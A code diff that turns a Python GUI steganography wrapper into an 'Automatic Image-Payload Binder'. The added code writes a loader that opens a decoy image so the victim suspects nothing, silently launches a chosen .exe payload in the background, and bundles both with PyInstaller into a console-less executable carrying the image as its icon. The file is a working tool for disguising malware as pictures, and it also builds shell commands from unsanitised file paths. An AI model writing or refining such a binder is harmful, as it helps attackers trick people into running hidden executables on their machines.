@@ -1,73 +1,55 @@
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
 import os
-import subprocess
 
-class StegoApp(ctk.CTk):
+class AutoBinder(ctk.CTk):
     def __init__(self):
         super().__init__()
-        self.title("Ethical Hacking: Stego Tool")
-        self.geometry("600x500")
-        ctk.set_appearance_mode("dark")
+        self.title("Automatic Image-Payload Binder")
+        self.geometry("500x400")
 
-        # UI Layout
-        self.label = ctk.CTkLabel(self, text="Payload Hider (Image/Audio)", font=("Arial", 24, "bold"))
+        self.label = ctk.CTkLabel(self, text="Create Auto-Run Image Payload", font=("Arial", 20, "bold"))
         self.label.pack(pady=20)
 
-        # 1. Payload Selection
-        self.payload_path = ""
-        self.btn_payload = ctk.CTkButton(self, text="1. Select Payload (.apk / .exe)", command=self.select_payload)
-        self.btn_payload.pack(pady=10)
+        # Inputs
+        self.img_path = ""
+        self.pay_path = ""
 
-        # 2. Cover File Selection
-        self.cover_path = ""
-        self.btn_cover = ctk.CTkButton(self, text="2. Select Cover File (JPG/WAV)", command=self.select_cover)
-        self.btn_cover.pack(pady=10)
+        self.btn_img = ctk.CTkButton(self, text="1. Select Display Image (.jpg)", command=self.get_img)
+        self.btn_img.pack(pady=10)
 
-        # 3. Password Entry
-        self.pass_entry = ctk.CTkEntry(self, placeholder_text="Enter Stego Password", show="*")
-        self.pass_entry.pack(pady=10)
+        self.btn_pay = ctk.CTkButton(self, text="2. Select Payload (.exe)", command=self.get_pay)
+        self.btn_pay.pack(pady=10)
 
-        # 4. Action Button
-        self.btn_execute = ctk.CTkButton(self, text="Embed Payload", fg_color="green", command=self.embed_data)
-        self.btn_execute.pack(pady=30)
+        self.btn_build = ctk.CTkButton(self, text="Build Auto-Image.exe", fg_color="red", command=self.build)
+        self.btn_build.pack(pady=30)
 
-        # Output Box
-        self.output_text = ctk.CTkTextbox(self, width=500, height=100)
-        self.output_text.pack(pady=10)
+    def get_img(self): self.img_path = filedialog.askopenfilename()
+    def get_pay(self): self.pay_path = filedialog.askopenfilename()
 
-    def select_payload(self):
-        self.payload_path = filedialog.askopenfilename(title="Select Payload")
-        self.log(f"Payload Selected: {os.path.basename(self.payload_path)}")
-
-    def select_cover(self):
-        self.cover_path = filedialog.askopenfilename(title="Select Cover File")
-        self.log(f"Cover File Selected: {os.path.basename(self.cover_path)}")
-
-    def log(self, message):
-        self.output_text.insert("end", message + "\n")
-
-    def embed_data(self):
-        if not self.payload_path or not self.cover_path or not self.pass_entry.get():
-            messagebox.showerror("Error", "Please fill all fields!")
+    def build(self):
+        if not self.img_path or not self.pay_path:
+            messagebox.showerror("Error", "Select both files!")
             return
-
-        password = self.pass_entry.get()
-        # Steghide Command
-        # -ef: embed file, -cf: cover file, -p: password
-        command = f"steghide embed -ef '{self.payload_path}' -cf '{self.cover_path}' -p '{password}'"
         
-        try:
-            self.log("Processing...")
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            if result.returncode == 0:
-                self.log("SUCCESS: Payload hidden inside cover file!")
-                messagebox.showinfo("Success", "Payload Embedded Successfully!")
-            else:
-                self.log(f"ERROR: {result.stderr}")
-        except Exception as e:
-            self.log(f"System Error: {str(e)}")
+        # Ek temp loader script generate karna
+        with open("loader.py", "w") as f:
+            f.write(f"""
+import subprocess, os, sys
+def run():
+    # Asli image kholna taaki user ko shak na ho
+    os.startfile('{os.path.basename(self.img_path)}')
+    # Background mein payload run karna
+    subprocess.Popen('{os.path.basename(self.pay_path)}', shell=True)
 
 if __name__ == "__main__":
-    app = StegoApp()
+    run()
+            """)
+        
+        # PyInstaller command jo sabko ek file mein bind kar degi
+        os.system(f"pyinstaller --noconsole --onefile --add-data '{self.img_path};.' --add-data '{self.pay_path};.' --icon='{self.img_path}' loader.py")
+        messagebox.showinfo("Success", "Build Complete! Check 'dist' folder.")
+
+if __name__ == "__main__":
+    app = AutoBinder()
     app.mainloop()
